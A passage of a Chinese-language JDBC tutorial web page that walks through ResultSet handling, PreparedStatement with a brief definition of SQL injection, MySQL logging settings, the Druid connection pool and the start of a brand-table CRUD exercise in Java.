15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>pojo：用来存放实体类，简单的 java 对象的包</p></blockquote><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>需求：将数据库中的数据封装为 account 对象，并存储到集合中</p></blockquote><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token annotation punctuation">@Test</span><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testResultSet2</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql://127.0.0.1:3306/db3?useSSL=false"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>    <span class="token class-name">Connection</span> conn <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Statement</span> statement <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">createStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM ACCOUNT"</span><span class="token punctuation">;</span>    <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> statement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">//创建一个集合</span>    <span class="token class-name">List</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Account</span><span class="token punctuation">></span></span> list <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ArrayList</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Account</span> account <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Account</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取数据</span>        <span class="token keyword">int</span> id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> name <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">double</span> money <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDouble</span><span class="token punctuation">(</span><span class="token string">"money"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置数据</span>        account<span class="token punctuation">.</span><span class="token function">setId</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>        account<span class="token punctuation">.</span><span class="token function">setName</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>        account<span class="token punctuation">.</span><span class="token function">setMoney</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//向列表内添加数据</span>        list<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span>account<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>list<span class="token punctuation">)</span><span class="token punctuation">;</span>    resultSet<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    statement<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    conn<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="35-preparedstatement"><a class="markdownIt-Anchor" href="#35-preparedstatement">#</a> 3.5 PreparedStatement</h2><ul><li>PreparedStatement 作用：<ol><li>预编译 SQL 语句并执行：预防 SQL 注入问题</li></ol></li><li>SQL 注入：<ul><li>SQL 注入是通过操作输入来修改事先定义好的 SQL 语句，用以达到执行代码对服务器进行攻击的方法</li></ul></li></ul><ol><li>获取 PreparedStatement 对象</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//SQL语句中的参数值，使用？占位符替代</span><span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from user where username = ? and password = ?"</span><span class="token punctuation">;</span><span class="token comment">//通过Connection对象获取，并传入对应的SQL语句</span><span class="token class-name">PreparedStatement</span> pstmt <span class="token operator">=</span> conn<span class="token punctuation">.</span><span class="token function">preparedStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li>设置参数值</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">PreparedStatement</span>对象：<span class="token function">setXxx</span><span class="token punctuation">(</span>参数<span class="token number">1</span>，参数<span class="token number">2</span><span class="token punctuation">)</span>：给？赋值<span class="token class-name">Xxx</span>：数据类型<span class="token punctuation">,</span>如<span class="token function">setInt</span><span class="token punctuation">(</span>参数<span class="token number">1</span>，参数<span class="token number">2</span><span class="token punctuation">)</span>参数：    参数<span class="token number">1</span>：？的位置编号，从<span class="token number">1</span>开始    参数<span class="token number">2</span>：？的值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ol start="3"><li>执行 SQL</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token function">executeUpdate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">/</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 不需要再传递SQL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>jdbc</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token operator">*</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">JDBCDemo5_PreparedStatement</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * PreparedStatement     * @throws Exception     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testPreparedStatement</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Class</span><span class="token punctuation">.</span><span class="token function">forName</span><span class="token punctuation">(</span><span class="token string">"com.mysql.jdbc.Driver"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> url <span class="token operator">=</span> <span class="token string">"jdbc:mysql:///db3?useSSL=false&amp;useServerPrepStmts=true"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> username <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> password <span class="token operator">=</span> <span class="token string">"root"</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> <span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> username<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置sql，用？代替参数的位置</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"SELECT * FROM EMP WHERE ID = ?"</span><span class="token punctuation">;</span>        <span class="token comment">//获取PreparedStatement，传递SQL</span>        <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//设置参数</span>        preparedStatement<span class="token punctuation">.</span><span class="token function">setInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//执行</span>        <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>resultSet<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">int</span> id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> name <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">String</span> gender <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getString</span><span class="token punctuation">(</span><span class="token string">"gende"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> salary <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDouble</span><span class="token punctuation">(</span><span class="token string">"salary"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">Date</span> join_date <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getDate</span><span class="token punctuation">(</span><span class="token string">"join_date"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">int</span> dept_id <span class="token operator">=</span> resultSet<span class="token punctuation">.</span><span class="token function">getInt</span><span class="token punctuation">(</span><span class="token string">"dept_id"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>gender<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>salary<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>join_date<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>dept_id<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"------------------"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>要使用预编译功能，在获取连接的 url 里要使用键值对 <code>useServerPrepStmts=true</code>  手动开启，默认是关闭的</li><li>配置 MySQL 执行日志（my.ini，重启 mysql 服务后生效）</li></ul><blockquote><span class="custom-blockquote-svg"><svg width="24" height="24" viewBox="0 0 24 24" fill="" xmlns="http://www.w3.org/2000/svg" data-reactroot=""><path fill="" d="M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z" undefined="1"></path><path fill="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z" undefined="1"></path><path fill="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z" undefined="1"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z"></path><path stroke-linejoin="round" stroke-linecap="round" stroke-miterlimit="10" stroke-width="2" stroke="" d="M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z"></path></svg></span><p>log-output=FILE</p><p>general-log=1</p><p>general_log_file=“D:\mysql.log”</p><p>slow-query-log=1</p><p>slow_query_log_file=“D:\mysql_slow.log”</p><p>long_query_time=2</p></blockquote><h1 id="4-数据库连接池"><a class="markdownIt-Anchor" href="#4-数据库连接池">#</a> 4、数据库连接池</h1><ul><li>数据链接池简介</li><li>Druid 数据库连接池</li></ul><h2 id="41-数据库连接池简介"><a class="markdownIt-Anchor" href="#41-数据库连接池简介">#</a> 4.1 数据库连接池简介</h2><ul><li>数据库连接池是个容器，负责分配、管理数据库连接（connection）</li><li>它允许应用程序重复使用一个现有的数据库连接，而不是再重新建立一个</li><li>释放空闲时间超过最大空闲时间的数据库连接来避免因为没有释放数据库连接而引起的数据库连接遗漏</li><li>好处：<ul><li>资源重用</li><li>提升系统响应速度</li><li>避免数据库连接遗漏</li></ul></li></ul><h2 id="42-数据库连接池实现"><a class="markdownIt-Anchor" href="#42-数据库连接池实现">#</a> 4.2 数据库连接池实现</h2><ul><li>标准接口：DataSource<ul><li>官方（SUN）提供的数据库连接池标准接口，由第三方组织实现此接口</li><li>功能：获取连接</li></ul></li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">Connection</span> <span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>常见的数据库连接池：<ul><li>DBCP</li><li>C3P0</li><li>Druid</li></ul></li><li>Druid (德鲁伊)：<ul><li>Druid 连接池是阿里巴巴开源的数据库连接池项目</li><li>功能强大，性能优秀，是 Java 语言最好的数据库连接池之一</li></ul></li></ul><h2 id="43-druid使用步骤"><a class="markdownIt-Anchor" href="#43-druid使用步骤">#</a> 4.3 Druid 使用步骤</h2><ol><li>导入 jar 包</li><li>定义配置文件</li><li>加载配置文件</li><li>获取数据库连接池对象</li><li>获取连接</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>druid</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSourceFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span><span class="token comment">/** * Druid数据库连接池演示 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">DruidDemo</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.导入jar包</span>        <span class="token comment">//2.定义配置文件</span>        <span class="token comment">//3.加载配置文件</span>        <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.获取连接池对象</span>        <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//5.获取对应数据库连接</span>        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//获取当前工作路径，用来判断导入文件时的路径</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"user.dir"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="练习"><a class="markdownIt-Anchor" href="#练习">#</a> 练习</h1><p>完成商品品牌数据的增删改查操作</p><ul><li><p>查询：查询所有数据</p></li><li><p>添加：添加品牌</p></li><li><p>修改：根据 id 修改</p></li><li><p>删除：根据 id 删除</p></li><li><p>准备环境：</p><ul><li>数据库表：tb_brand</li><li>实体类 Brand</li><li>测试用例</li></ul></li></ul><h2 id="1-查询所有数据"><a class="markdownIt-Anchor" href="#1-查询所有数据">#</a> 1、查询所有数据</h2><ol><li>获取 Connection</li><li><strong>定义 SQL</strong>：select * from tb_brand;</li><li>获取 PreparedStetement 对象</li><li><strong>设置参数</strong>：不需要</li><li>执行 SQL</li><li><strong>处理结果</strong>：List&lt;Brand&gt;</li><li>释放资源</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">example</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>alibaba<span class="token punctuation">.</span>druid<span class="token punctuation">.</span>pool<span class="token punctuation">.</span></span><span class="token class-name">DruidDataSourceFactory</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>itheima<span class="token punctuation">.</span>pojo<span class="token punctuation">.</span></span><span class="token class-name">Brand</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>junit<span class="token punctuation">.</span></span><span class="token class-name">Test</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">DataSource</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">FileInputStream</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">Connection</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">PreparedStatement</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>sql<span class="token punctuation">.</span></span><span class="token class-name">ResultSet</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">ArrayList</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">List</span></span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Properties</span></span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BrandTest</span> <span class="token punctuation">&#123;</span>    <span class="token comment">/**     * 查询所有     * 核心思想：     * 1.select * from tb_brand;     * 2.参数：不需要     * 3.结果：Lsit&lt;Brand>     */</span>    <span class="token annotation punctuation">@Test</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">testSelectAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>        <span class="token comment">//1.获取Connection</span>        <span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"src/druid.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">DataSource</span> dataSource <span class="token operator">=</span> <span class="token class-name">DruidDataSourceFactory</span><span class="token punctuation">.</span><span class="token function">createDataSource</span><span class="token punctuation">(</span>prop<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">Connection</span> connection <span class="token operator">=</span> dataSource<span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>connection<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//2.定义SQL语句</span>        <span class="token class-name">String</span> sql <span class="token operator">=</span> <span class="token string">"select * from tb_brand;"</span><span class="token punctuation">;</span>        <span class="token comment">//3.获取PreparedStatement对象</span>        <span class="token class-name">PreparedStatement</span> preparedStatement <span class="token operator">=</span> connection<span class="token punctuation">.</span><span class="token function">prepareStatement</span><span class="token punctuation">(</span>sql<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//4.设置参数——无参数</span>        <span class="token comment">//5.执行SQL</span>        <span class="token class-name">ResultSet</span> resultSet <span class="token operator">=</span> preparedStatement<span class="token punctuation">.</span><span class="token function">executeQuery</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token 